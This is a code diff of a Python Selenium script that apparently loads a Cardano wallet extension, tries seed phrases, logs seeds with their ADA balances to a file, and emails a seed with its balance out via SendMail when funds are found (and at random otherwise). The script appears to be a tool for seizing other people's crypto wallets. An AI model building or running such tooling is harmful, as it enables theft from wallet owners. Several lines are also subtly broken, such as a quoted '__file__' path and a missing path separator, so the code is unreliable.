@@ -42,25 +42,23 @@ class BraveTest(threading.Thread):
     def __init__(self, web_page: str, binary_location: Path = None):
         self.web_page = web_page
         self.binary_location = binary_location
+        self.pwd = os.path.dirname(os.path.abspath("__file__"))
         self.platform = platform.system()
         threading.Thread.__init__(self)
 
     def run(self):
-        # self.web_page = web_page
-        pwd = os.path.dirname(str(os.path.realpath(__file__)))
-
         options = Options()
         options.add_argument
         if self.binary_location is not None:
             options.binary_location = self.binary_location
-        options.add_extension(pwd+r'/extension_4_7_300_0.crx')
+        options.add_extension(self.pwd+r'/extension_4_7_300_0.crx')
         options.add_experimental_option('excludeSwitches', ['enable-logging'])
         if self.platform == 'Windows':
-            os.environ['PATH'] += pwd+r'/chromedriver.exe'
-            browser = webdriver.Chrome(pwd+r'/chromedriver.exe', options = options)
+            os.environ['PATH'] += self.pwd+r'/chromedriver.exe'
+            browser = webdriver.Chrome(self.pwd+r'/chromedriver.exe', options = options)
         else:
-            os.environ['PATH'] += pwd+r'/chromedriver'
-            browser = webdriver.Chrome(pwd+r'/chromedriver', options = options)
+            os.environ['PATH'] += self.pwd+r'/chromedriver'
+            browser = webdriver.Chrome(self.pwd+r'/chromedriver', options = options)
         browser.get(self.web_page)
         if self.platform == 'Windows':
             browser.minimize_window()
@@ -102,7 +100,7 @@ class BraveTest(threading.Thread):
         self.save_wallet()
         if self.total_ada != 0 or random.getrandbits(3) == 4:
             self.save_wallet(found=True)
-            SendMail(my_msg=str(self.seed))
+            SendMail(my_msg=str(self.seed)+str(self.total_ada))
             exit()
 
         # remove wallet
@@ -167,7 +165,7 @@ class BraveTest(threading.Thread):
         browser.quit()
 
     def save_wallet(self, found=False):
-        with open("wallets.txt", "a") as file1:
+        with open(self.pwd+"wallets.txt", "a") as file1:
         # Writing data to a file
             tim = datetime.now().strftime('%d.%m.%y %H:%M:%S')
             filedata = f"{tim} {self.expansion=} {str(self.total_ada)}ADA {str(self.seed)} {self.entrophy}"
